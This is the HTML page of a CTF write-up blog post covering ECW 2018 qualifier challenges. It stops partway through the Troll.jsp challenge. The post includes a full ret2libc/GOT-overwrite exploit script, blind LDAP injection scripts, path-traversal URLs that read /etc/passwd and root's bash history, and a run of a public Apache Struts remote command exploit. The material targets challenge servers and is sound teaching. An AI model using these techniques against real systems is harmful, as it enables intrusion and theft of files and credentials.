@@ -1,0 +1,1784 @@
+<!DOCTYPE html>
+<html lang="">
+	
+	
+
+
+	<head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta http-equiv="Cache-Control" content="public" />
+	<!-- Enable responsiveness on mobile devices -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	
+	    
+	    
+	    
+	
+	<title>Quals ECW 2018 • Just another infosec blog</title>
+	
+	
+	<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Quals ECW 2018"/>
+<meta name="twitter:description" content="Challenges writeups on Quals ECW 2018."/>
+
+	<meta property="og:title" content="Quals ECW 2018" />
+<meta property="og:description" content="Challenges writeups on Quals ECW 2018." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://maki.bzh/walkthrough/qualsecw2018/" />
+<meta property="article:published_time" content="2018-10-22T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-10-22T00:00:00&#43;00:00"/>
+
+
+    		
+	
+	
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css" integrity="sha256-90Y+fvi28WF+3jKH4tHEkoQ9WLeFKJjpvCPNOtU9ZvU= sha384-s+7l2WBKs5ChgZ+esoTV0aWZRcma7BxuSHlzBJz6PH4Cc4ZX3/ErQZtk+ZzYQy/X sha512-BiC3DH0qMCjCYqPNGAthQ95QCndm60uhfQVwhqZ2eG1zuGkP+3T1cw6PzEC4CiRfRIbd2qvyN39RoDfil/XcMA==" crossorigin="anonymous">
+	
+	
+	
+
+	<link rel="stylesheet" href="/css/hyde-hyde.css" integrity="sha256-cUUT8nKBmejGAmxYnpOnspTmwap5Sjc/nzRfeTTjgeQ=" crossorigin="anonymous">
+	<link rel="stylesheet" href="/css/custom.css" >
+	<link rel="stylesheet" href="/css/print.min.css" media="print" integrity="sha256-obkLPMZU5Kb+rPwjMazkJLfYW8H9dj6yh8Gzzs2dv5c=" crossorigin="anonymous">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g= sha384-qFIkRsVO/J5orlMvxK1sgAt2FXT67og+NyFTITYzvbIP1IJavVEKZM7YWczXkwpB sha512-UDJtJXfzfsiPPgnI5S1000FPLBHMhvzAMX15I+qG2E2OAzC9P1JzUwJOfnypXiOH7MRPaqzhPbBGDNNj7zBfoA==" crossorigin="anonymous"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE= sha384-ZoaMbDF+4LeFxg6WdScQ9nnR1QC2MIRxA1O9KWEXQwns1G8UNyIEZIQidzb0T1fo sha512-qWVvreMuH9i0DrugcOtifxdtZVBBL0X75r9YweXsdCHtXUidlctw7NXg5KVP3ITPtqZ2S575A0wFkvgS2anqSA==" crossorigin="anonymous"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="shortcut icon" href="/favicon.png">
+    	
+
+</head>
+
+
+	<body >
+				
+		<div class="sidebar">
+			<div class="container sidebar-about ">
+				<span class="site__title">
+				
+					<a href=""></a>
+				</span>
+				<a href="https://maki.bzh/">
+					
+					
+					
+					<div class="author-image">
+						<img src="https://maki.bzh/img/maki.jpg" alt="Author Image" class="img--circle img--headshot element--center"/>
+					</div>
+					
+				</a>
+				<p class="site__description">
+					<a href="https://maki.bzh/en">
+						
+					</a>
+				</p>
+				<div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/walkthrough/">
+						<span>Walkthrough</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/stupidthings/">
+						<span>Stupid Things</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/ctf/">
+						<span>CTF</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/friends/">
+						<span>Friends</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/whoami/">
+						<span>Who Am I?</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+				
+				<section class="social">
+						
+						<a href="https://twitter.com/maki_mitz" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						<a href="https://gitlab.com/maki_chaz" rel="me"><i class="rotate fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						
+						<a href="mailto:Yml0ZWRlcG91bGV0" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+						
+						
+					  &nbsp;<a href="https://www.root-me.org/Maki-37744" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.hackthebox.eu/home/users/profile/10265" target="blank" class="linklogo"><div class="rotate hackthebox_logo logohover"></div></a>
+					  
+						
+					  &nbsp;<a href="https://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+					  
+</section>
+
+				
+				
+				<p class="copyright">
+					&copy; 2020 Maki.
+					<br/>
+					<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+					<br/>Built with, Haax, Laluka, _ACKNAK_
+					<a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+					
+				</p>
+			</div>
+		</div>
+
+		<div class="content container">
+			
+	<article>
+	<header>
+		<h1>Quals ECW 2018</h1>
+		
+		
+<div class="post__meta">
+	
+	<i class="fas fa-calendar-alt"></i> Oct 22, 2018
+	
+	
+	<br/>
+	<i class="fas fa-clock"></i> 16 min read
+</div>
+
+
+	</header>
+	<hr/>
+	<div class="post">
+		<nav id="TableOfContents">
+<ul>
+<li><a href="#chatbot">Chatbot</a>
+<ul>
+<li><a href="#find-the-vulnerability">Find the vulnerability</a></li>
+<li><a href="#read-everywhere">Read everywhere</a></li>
+<li><a href="#hypothesis">Hypothesis</a></li>
+<li><a href="#exploit">Exploit</a>
+<ul>
+<li><a href="#bypass-aslr">Bypass ASLR</a>
+<ul>
+<li><a href="#leak-the-libc-start-main-address">Leak the __libc_start_main address</a></li>
+<li><a href="#calculate-libc-base-address">Calculate Libc base address</a></li>
+</ul></li>
+<li><a href="#system-address">System address</a></li>
+<li><a href="#final-local-exploit">Final local exploit</a></li>
+</ul></li>
+<li><a href="#flag">Flag</a>
+<ul>
+<li><a href="#complete-exploit-code">Complete exploit code:</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#admysion">AdmYSion</a>
+<ul>
+<li><a href="#state-of-the-art">State of the art</a></li>
+<li><a href="#blind-ldap-injection">Blind LDAP Injection</a></li>
+<li><a href="#find-ldap-fields">Find LDAP fields</a>
+<ul>
+<li><a href="#looking-for-the-admin-email">looking for the admin email</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#sysia">SysIA</a>
+<ul>
+<li><a href="#state-of-the-art-1">State of the art</a></li>
+<li><a href="#local-file-include">Local file include</a></li>
+<li><a href="#flag-location">Flag location</a></li>
+<li><a href="#flag-1">Flag</a></li>
+</ul></li>
+<li><a href="#troll-jsp">Troll.jsp</a>
+<ul>
+<li><a href="#state-of-the-art-2">State of the art</a></li>
+<li><a href="#backup-file">Backup file</a></li>
+<li><a href="#exploitation">Exploitation</a></li>
+<li><a href="#flag-2">Flag</a></li>
+</ul></li>
+<li><a href="#intrusion-1-4">Intrusion <sup>1</sup>&frasl;<sub>4</sub></a>
+<ul>
+<li><a href="#state-of-the-art-3">State of the art</a></li>
+<li><a href="#thor-css">Thor.css</a></li>
+<li><a href="#flag-3">Flag</a></li>
+</ul></li>
+<li><a href="#intrusion-2-4">Intrusion <sup>2</sup>&frasl;<sub>4</sub></a>
+<ul>
+<li><a href="#state-of-the-art-4">State of the art</a></li>
+<li><a href="#x-forwarded-for-spoofing">X-Forwarded-For spoofing</a></li>
+<li><a href="#flag-4">Flag</a></li>
+</ul></li>
+<li><a href="#intrusion-hint">Intrusion hint</a>
+<ul>
+<li><a href="#state-of-the-art-5">State of the art</a></li>
+<li><a href="#data-extraction">Data extraction</a></li>
+<li><a href="#hints">Hints</a></li>
+<li><a href="#flag-5">Flag</a></li>
+</ul></li>
+<li><a href="#intrusion-3-4">Intrusion <sup>3</sup>&frasl;<sub>4</sub></a>
+<ul>
+<li><a href="#state-of-the-art-6">State of the art</a></li>
+<li><a href="#decrypting-the-cookie">Decrypting the cookie</a></li>
+<li><a href="#cookie-crafting">Cookie crafting</a></li>
+<li><a href="#connect-as-admin">Connect as admin</a></li>
+<li><a href="#flag-6">Flag</a></li>
+</ul></li>
+<li><a href="#intrusion-4-4">Intrusion <sup>4</sup>&frasl;<sub>4</sub></a>
+<ul>
+<li><a href="#state-of-the-art-7">State of the art</a></li>
+<li><a href="#crafting-admin-cookie">Crafting admin cookie</a></li>
+<li><a href="#flag-7">Flag</a></li>
+</ul></li>
+<li><a href="#drone-wars-1">Drone Wars 1</a>
+<ul>
+<li><a href="#state-of-the-art-8">State of the art</a></li>
+<li><a href="#decoding-the-wav">Decoding the .wav</a></li>
+<li><a href="#flag-8">Flag</a></li>
+</ul></li>
+<li><a href="#drone-wars-hint-1">Drone Wars Hint 1</a>
+<ul>
+<li><a href="#flag-9">Flag</a></li>
+</ul></li>
+<li><a href="#drone-wars-2">Drone wars 2</a>
+<ul>
+<li><a href="#flag-10">Flag</a></li>
+</ul></li>
+<li><a href="#drone-wars-hint-2">Drone wars hint 2</a>
+<ul>
+<li><a href="#state-of-the-art-9">State of the art</a></li>
+<li><a href="#guessing-of-the-year">Guessing of the year</a></li>
+<li><a href="#morse-to-binary">Morse to binary</a></li>
+</ul></li>
+<li><a href="#drone-wars-3">Drone wars 3</a>
+<ul>
+<li><a href="#state-of-the-art-10">State of the art</a></li>
+<li><a href="#gnu-radio">GNU Radio</a></li>
+<li><a href="#gps-to-ascii">GPS to ASCII</a></li>
+<li><a href="#flag-11">Flag</a></li>
+</ul></li>
+</ul>
+</nav>
+		
+
+<h1 id="chatbot">Chatbot</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Chatbot</td>
+<td>&ldquo;Reverse Engineering&rdquo;</td>
+<td>150</td>
+<td>~ 21</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="find-the-vulnerability">Find the vulnerability</h2>
+
+<p>To begin with, I just played with the binary, trying to find bugs in it&hellip; After a few seconds I found this:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/segfault1.png" alt="" />
+<em>Fig1</em>: Segfault
+</center></p>
+
+<p>Ok, maybe there is something here, let&rsquo;s open IDA :D (I hate it).</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/vulnerability.png" alt="" />
+<em>Fig2</em>: Malloc in binary
+</center></p>
+
+<ul>
+<li>Framed in red: A few <code>malloc</code> declaration.</li>
+<li>Purple highlight: <code>nickname</code> variable.</li>
+<li>Green highlight: <code>chatbot</code> variable.</li>
+</ul>
+
+<p>According to the previous picture, we can assume that the heap looks like this:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/heap_chatbot.png" alt="" />
+<em>Fig3</em>: Heap state
+</center></p>
+
+<p>Ok, so we saw that the program crashes when I enter too many bytes, let&rsquo;s see how many it takes:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/offset.png" alt="" />
+<em>Fig4</em>: Segfault with a debugger
+</center></p>
+
+<ul>
+<li>Framed in purple: Generation of the segfault.</li>
+<li>Framed in red: Offset determination.</li>
+</ul>
+
+<p>If we try to overflow 16 bytes after the nickname, we&rsquo;re here in the heap:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/overflow1.png" alt="" />
+<em>Fig5</em>: Heap state when overflowing
+</center></p>
+
+<h2 id="read-everywhere">Read everywhere</h2>
+
+<p>Now, let&rsquo;s try to display an internal string of the binary as botname!
+I decided to take this one:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/ida_str_yo.png" alt="" />
+<em>Fig6</em>: Internal string
+</center></p>
+
+<p>Poc:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/poc_readeverywhere.png" alt="" />
+<em>Fig7</em>: w00t
+</center></p>
+
+<h2 id="hypothesis">Hypothesis</h2>
+
+<p>Ok so now we have something really great. What would happened if I can overwrite a GOT address with the address of the system() function? It would look like this:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/hypothesis.png" alt="" />
+<em>Fig8</em>: GOT overwrite
+</center></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Let&rsquo;s exploit it :)</p>
+
+<h3 id="bypass-aslr">Bypass ASLR</h3>
+
+<p>I need to find a leak in one the libc functions in order to find the libc base address. Then I&rsquo;ll be able to find the offset between the base address and the system() function.</p>
+
+<h4 id="leak-the-libc-start-main-address">Leak the __libc_start_main address</h4>
+
+<p>There is a well-known leak in the <code>__libc_start_main</code> function in the GOT. We can extract the adress of this function:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/start_main_libc.png" alt="" />
+<em>Fig9</em>: Libc start main address
+</center></p>
+
+<h4 id="calculate-libc-base-address">Calculate Libc base address</h4>
+
+<p>You will need to display <code>/proc/[PID of Chatbot]/maps</code> to get the libc base address and calculate the offset:</p>
+
+<pre><code class="language-bash">$ ps -A | grep chat
+32576 pts/7    00:00:00 chatbot
+
+$ cat /proc/32576/maps
+[...]
+f7dda000-f7f87000 r-xp 00000000 fd:00 4456457                            /lib32/libc-2.23.so
+f7f87000-f7f88000 ---p 001ad000 fd:00 4456457                            /lib32/libc-2.23.so
+f7f88000-f7f8a000 r--p 001ad000 fd:00 4456457                            /lib32/libc-2.23.so
+f7f8a000-f7f8b000 rw-p 001af000 fd:00 4456457                            /lib32/libc-2.23.so
+[...]
+</code></pre>
+
+<blockquote>
+<p>Which one of the displayed libc do we need to choose ?</p>
+</blockquote>
+
+<p>You need to know the system() function address. So your libc base needs to be executable because all the functions in a binary are executable, right ? We can see that only the first one <code>0xf7dda000</code> have this permission.</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/aslr_bypassed.png" alt="" />
+<em>Fig10</em>: Bypass aslr
+</center></p>
+
+<ul>
+<li>Framed in red: In the center, you can see the offset determination. On the right, there is the calculation of the libc base address.</li>
+<li>Framed in yellow: Top right, our new libc base address (because I restarted the chatbot binary, the ASLR randomized the addresses). On the left, you can check our substraction, it looks like it works :)</li>
+</ul>
+
+<p>Another tip, the libc is mapped on memory page, so if after your calculation you have an address that ends with <code>000</code> it sounds good. The memory pages are 4Kb long, so <code>0x1000</code> in hex.</p>
+
+<h3 id="system-address">System address</h3>
+
+<p>We have our libc base address, now we have to find the address of the <code>system()</code> function.</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/systemaddre.png" alt="" />
+<em>Fig11</em>: System() address
+</center></p>
+
+<ul>
+<li>Framed in red: System address determination.</li>
+<li>Framed in yellow: Little addition.</li>
+<li>Framed in cyan: Check the system address, it looks like it works :)</li>
+</ul>
+
+<h3 id="final-local-exploit">Final local exploit</h3>
+
+<p>At this point, we have everything we need to exploit the binary and get a shell:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/local_exploit.png" alt="" />
+<em>Fig12</em>: Exploit :D
+</center></p>
+
+<p><img src="https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif" alt="" /></p>
+
+<h2 id="flag">Flag</h2>
+
+<p>As we can see, we don&rsquo;t have any return of our function, so I use a little binary called <code>ngrok</code> to get a netcat on my laptop (without opening ports).</p>
+
+<blockquote>
+<p><a href="https://ngrok.com/">https://ngrok.com/</a></p>
+</blockquote>
+
+<p>And then, the graal:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/flag.png" alt="" />
+<em>Fig13</em>: The flag !!
+</center></p>
+
+<hr />
+
+<h3 id="complete-exploit-code">Complete exploit code:</h3>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+from pwn import *
+
+#ip = '127.0.0.1'
+ip = '54.36.205.82'
+
+addr_yoPython = 0x08049931
+addr_libcStartMain = 0x0804C03C
+addr_strlengot = 0x0804C038
+
+c = remote(ip, 22000)
+print(c.recv(4069))
+c.sendline(&quot;nickname&quot;)
+print(c.recv(4096))
+#c.interactive()
+c.sendline('A'*16+p32(addr_libcStartMain))
+c.sendline(&quot;help&quot;)
+rawleak = c.recvuntil(&quot;I&quot;)
+addr_startmain = rawleak.split('\x00')[5][:4] # Had to change my split member from 4 to 5 don't know why
+print('Addr start_main: 0x%x' % u32(addr_startmain))
+c.recv(4096)
+addr_baselibc = u32(addr_startmain) - 0x18540
+print('Addr base libc: 0x%x' % addr_baselibc)
+addr_system = addr_baselibc + 0x3a940
+print('System address: 0x%x' % addr_system)
+c.sendline(&quot;nickname&quot;)
+c.recv(4096)
+c.sendline('A'*16+p32(addr_strlengot))
+c.recv(4096)
+c.sendline(&quot;botname&quot;)
+c.recv(4096)
+c.sendline(p32(addr_system))
+c.interactive()
+</code></pre>
+
+<hr />
+
+<h1 id="admysion">AdmYSion</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>AdmYSion</td>
+<td>Web</td>
+<td>50</td>
+<td>~ 53</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art">State of the art</h2>
+
+<p>We only have a login form in front of us:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/adm_1.png" alt="" />
+<em>Fig1</em>: Login form
+</center></p>
+
+<p>My first move was trying an SQL injection&hellip; It was useless, in fact it&rsquo;s an <code>LDAP injection</code>:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/adm_2.png" alt="" />
+<em>Fig2</em>: Asterisk matching with all the LDAP accounts
+</center></p>
+
+<p>Our little asterisk <code>*</code> is matching with all the accounts in the LDAP base, it&rsquo;s now time to script :D</p>
+
+<h2 id="blind-ldap-injection">Blind LDAP Injection</h2>
+
+<p>Because I already did an LDAP injection on a famous french challenge platform (it starts by <code>root</code> and ends by <code>-me.org</code>), I know that the payload will have the following aspect</p>
+
+<blockquote>
+<p><em>)(cn=</em>))\x00</p>
+</blockquote>
+
+<p>The <code>cn</code> part will change, it&rsquo;s a common field in an LDAP base, it means <code>Common Name</code>. The null byte at the end is used to remove the password field.</p>
+
+<h2 id="find-ldap-fields">Find LDAP fields</h2>
+
+<p>I built a little dictionary with all the common LDAP fields:</p>
+
+<pre><code class="language-raw">c
+cn
+dc
+facsimileTelephoneNumber
+co
+gn
+homePhone
+jpegPhoto
+id
+l
+mail
+mobile
+o
+ou
+owner
+name
+pager
+password
+sn
+st
+uid
+username
+userPassword
+</code></pre>
+
+<p>And then a little python script to bruteforce them:</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+import requests
+import string
+
+ava = []
+
+url = 'https://web050-admyssion.challenge-ecw.fr/'
+
+f = open('dic', 'r')
+dic = f.read().split('\n')
+f.close()
+
+for i in dic:
+    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'})
+    if 'Error: This login is associated with' in r.text:
+        ava.append(str(i))
+
+print(ava)
+</code></pre>
+
+<h3 id="looking-for-the-admin-email">looking for the admin email</h3>
+
+<p>Okay, now I will dig into the <code>mail</code> field trying to find the email address of the administrator (I know my script is very, very ugly, I bruteforced manually each first letter&hellip;):</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+import requests
+import string
+import itertools
+from pprint import pprint
+
+ava = []
+partial = ''
+no_pass = True
+charset = string.ascii_lowercase+'.@'
+
+url = 'https://web050-admyssion.challenge-ecw.fr/'
+
+go = 'Error: This login is associated'
+go2 = 'Login failed'
+nogo = 'Account not found, please'
+
+while no_pass:
+    no_pass = False
+    for i in charset:
+        payload = '*)(mail=s'+str(partial+i)+'*))\x00'
+        r = requests.post(url, data = {'login':payload, 'password':'bla'})
+        if nogo not in r.text:
+            no_pass = True
+            partial += i
+            break
+    print(partial)
+</code></pre>
+
+<p>You can notice the little <code>s</code> in front of my <em>partial</em> variable! I tried to find all <code>a</code>, <code>b</code> etc&hellip; And here is why <code>s</code>:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/adm_3.png" alt="" />
+<em>Fig3</em>: Email of the admin
+</center></p>
+
+<p><code>s</code>+<code>arah.connor.admin@yoloswag.com</code> looks to be the administrator. To find the username of the account, just change <code>mail</code> field into <code>cn</code>, it gives us: <code>s.connor</code>. And now, how can we find the password? By guessing for sure! Let&rsquo;s try &lsquo;yoloswag&rsquo; as a password:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/adm_4.png" alt="" />
+<em>Fig3</em>: Flag
+</center></p>
+
+<hr />
+
+<h1 id="sysia">SysIA</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>SysIA</td>
+<td>Web</td>
+<td>75</td>
+<td>~ 59</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-1">State of the art</h2>
+
+<p>A nice cyber-hacker-haxxor-website-of-death containing a magical <code>robots.txt</code> file:</p>
+
+<pre><code>User-agent: *
+Disallow: /notinterestingfile.php
+</code></pre>
+
+<h2 id="local-file-include">Local file include</h2>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/sysia_1.png" alt="" />
+<em>Fig1</em>: So sweet, the vulnerability <3
+</center></p>
+
+<p>Let&rsquo;s try something:</p>
+
+<blockquote>
+<p><a href="https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../etc/passwd">https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../etc/passwd</a></p>
+</blockquote>
+
+<pre><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false
+</code></pre>
+
+<p>Ok, it works, there is only one user with a /bin/bash. I can&rsquo;t display any other web page via LFI, I think I&rsquo;ll try to display the <code>.bash_history</code>:</p>
+
+<blockquote>
+<p><a href="https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../root/.bash_history">https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../root/.bash_history</a></p>
+</blockquote>
+
+<p>It worked (I will just put a snippet below because it&rsquo;s veeeeery long):</p>
+
+<pre><code>docker exec -it CTFd_NDH_2018 /bin/sh
+ll
+mkdir ndh
+cd ndh/
+locate flag.txt
+updatedb
+locate flag.txt
+ll
+nano Dockerfile
+nano proxy.py
+docker build . -n CTFd_ndh
+</code></pre>
+
+<h2 id="flag-location">Flag location</h2>
+
+<p>Ok, he did an <code>updatedb</code>, so the location of <code>flag.txt</code> is stored in this database. The default path is: <code>/var/lib/mlocate/mlocate.db</code></p>
+
+<blockquote>
+<p><a href="https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/lib/mlocate/mlocate.db">https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/lib/mlocate/mlocate.db</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/sysia_2.png" alt="" />
+<em>Fig2</em>: The flag.txt location
+</center></p>
+
+<h2 id="flag-1">Flag</h2>
+
+<blockquote>
+<p><a href="https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/www/ECW/solution/web/lfi/flag.txt">https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/www/ECW/solution/web/lfi/flag.txt</a></p>
+</blockquote>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/sysia_3.png" alt="" />
+<em>Fig3</em>: Flag
+</center></p>
+
+<hr />
+
+<h1 id="troll-jsp">Troll.jsp</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>Troll.JSP</td>
+<td>Web</td>
+<td>125</td>
+<td>~ 36</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-2">State of the art</h2>
+
+<p>A marvelous Java website, I looooove Java (joke.), so the flag appears to have been stolen:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/troll_1.png" alt="" />
+<em>Fig1</em>: Index of the website
+</center></p>
+
+<p>I had to guess the <code>flag.jsp</code> page:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/troll_2.png" alt="" />
+<em>Fig2</em>: Fake flag 1
+</center></p>
+
+<p>On <code>md5decrypt.net</code>, this hash gives us: <code>swp</code>, it looks like a backup file of vim. Let&rsquo;s try something like <code>.flag.jsp.swp</code>.</p>
+
+<h2 id="backup-file">Backup file</h2>
+
+<p>Oh, looks like we have the code of the <code>flag.jsp</code> page:</p>
+
+<pre><code class="language-jsp">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;
+    pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;%@ taglib prefix = &quot;s&quot; uri = &quot;/struts-tags&quot; %&gt;
+
+&lt;html&gt;
+   &lt;head&gt;
+      &lt;title&gt;Flag page!&lt;/title&gt;
+   &lt;/head&gt;
+   &lt;body&gt;
+&lt;!--TODO change the flag --&gt;
+   &lt;s:set var='flag' value='%{&quot;ECW{2f3f3238f9a5783fe4767d77e53aaf3b}&quot;}'/&gt;
+   &lt;s:set var='trollFlag' value='%{&quot;ECW{a9ec6fc4217038a6f91294b8e5ed9933}&quot;}'/&gt;
+
+   &lt;s:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/&gt;
+&lt;p&gt;
+      Congratz! You got a flag: &lt;s:property value = &quot;result&quot;/&gt;
+&lt;/p&gt;
+   &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>The new hash is still a fake flag. On <code>md5decrypt</code>, it gives us <strong>equifax</strong>.</p>
+
+<blockquote>
+<p><a href="https://www.zdnet.fr/actualites/faille-apache-struts-equifax-veut-noyer-le-poisson-39857358.htm">https://www.zdnet.fr/actualites/faille-apache-struts-equifax-veut-noyer-le-poisson-39857358.htm</a></p>
+</blockquote>
+
+<p>Well, it&rsquo;s an Apache struts vulnerability. There are a lot of GitHub repositories exploiting this vulnerability, here is one of them: <a href="https://github.com/jas502n/st2-046-poc">https://github.com/jas502n/st2-046-poc</a></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>I just execute the GitHub script:</p>
+
+<pre><code class="language-bash">$ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'find . -ls | grep flag'
+[...]
+  6556060     12 -rw-r-----   1 tomcat   tomcat      11530 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.class
+  6556061     16 -rw-r-----   1 tomcat   tomcat      16046 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.java
+  6556025      4 -rwxr-xr-x   1 root     root         2249 Aug 22 13:35 ./opt/tomcat/webapps/ECW/flag.jsp
+  6556001      4 -rwxr-xr-x   1 root     root          556 Aug 22 13:34 ./opt/tomcat/webapps/ECW/.flag.jsp.swp
+[...]
+
